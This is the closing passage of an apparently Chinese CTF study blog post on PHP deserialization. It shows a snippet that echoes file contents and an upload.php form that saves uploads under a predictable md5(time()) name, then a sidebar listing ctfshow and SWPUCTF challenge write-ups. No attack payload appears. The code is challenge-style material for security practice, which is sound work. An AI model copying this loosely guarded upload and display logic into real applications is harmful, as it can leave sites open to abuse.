class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;textarea <span class="class"><span class="keyword">class</span>=&quot;<span class="title">file_content</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">value</span>=&lt;?<span class="title">php</span> <span class="title">echo</span> &quot;&lt;<span class="title">br</span>&gt;&quot;.$<span class="title">contents</span>;?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></div></figure>





<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;aa&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5668;&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;&#x8BF7;&#x9009;&#x62E9;&#x8981;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF1A;&lt;p&gt;</span><br><span class="line">            &lt;input <span class="class"><span class="keyword">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;&#x4E0A;&#x4F20;&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span>(<span class="title">isset</span>($<span class="title">_POST</span>[&apos;<span class="title">submit</span>&apos;]))</span>{</span><br><span class="line">        <span class="variable">$upload_path</span>=<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&apos;upload_file&apos;</span>][<span class="string">&apos;tmp_name&apos;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_path</span>)) {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF1A;&quot;</span>.<span class="variable">$upload_path</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&apos;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&apos;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">Kirsten Carton</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2022/07/30/7-30/">http://example.com/2022/07/30/7-30/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Cctfshow/">反序列化，ctfshow</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/09/24/sql-sql/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">sql!sql!</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/07/24/7-23/"><span class="paginator-prev__text">7.23</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">
          反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">
          前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#show"><span class="toc-number">1.1.1.</span> <span class="toc-text">
          show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#255"><span class="toc-number">1.1.2.</span> <span class="toc-text">
          255</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#256"><span class="toc-number">1.1.3.</span> <span class="toc-text">
          256</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#257"><span class="toc-number">1.1.4.</span> <span class="toc-text">
          257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#258"><span class="toc-number">1.1.5.</span> <span class="toc-text">
          258</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#259"><span class="toc-number">1.1.6.</span> <span class="toc-text">
          259</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#260"><span class="toc-number">1.1.7.</span> <span class="toc-text">
          260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#261"><span class="toc-number">1.1.8.</span> <span class="toc-text">
          261</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#262"><span class="toc-number">1.1.9.</span> <span class="toc-text">
          262</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#263"><span class="toc-number">1.1.10.</span> <span class="toc-text">
          263</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#264"><span class="toc-number">1.1.11.</span> <span class="toc-text">
          264</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#265"><span class="toc-number">1.1.12.</span> <span class="toc-text">
          265</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#266"><span class="toc-number">1.1.13.</span> <span class="toc-text">
          266</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#267"><span class="toc-number">1.1.14.</span> <span class="toc-text">
          267</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">2.</span> <span class="toc-text">
          PHP！！！！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E5%90%97%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">3.</span> <span class="toc-text">
          学吗攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#20220816"><span class="toc-number">3.1.</span> <span class="toc-text">
          20220816</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E4%BC%9F%E4%BD%A0%E5%8F%88%E5%9C%A8%E6%90%AD%E5%8D%9A%E5%AE%A2%E6%8B%89"><span class="toc-number">3.1.1.</span> <span class="toc-text">
          阿伟你又在搭博客拉</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20220819"><span class="toc-number">3.2.</span> <span class="toc-text">
          20220819</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20220820"><span class="toc-number">3.3.</span> <span class="toc-text">
          20220820</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20220823"><span class="toc-number">3.4.</span> <span class="toc-text">
          20220823</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20220825"><span class="toc-number">3.5.</span> <span class="toc-text">
          20220825</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">4.</span> <span class="toc-text">
          [ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">5.</span> <span class="toc-text">
          [SWPUCTF 2021 新生赛]pop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">6.</span> <span class="toc-text">
          [SWPUCTF 2021 新生赛]babyunser</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="images/imageone/avator one.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">May you be faithful to yourself,live seriously and freely.</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/KirstenCarton" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">37</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">38</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Kirsten Carton</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>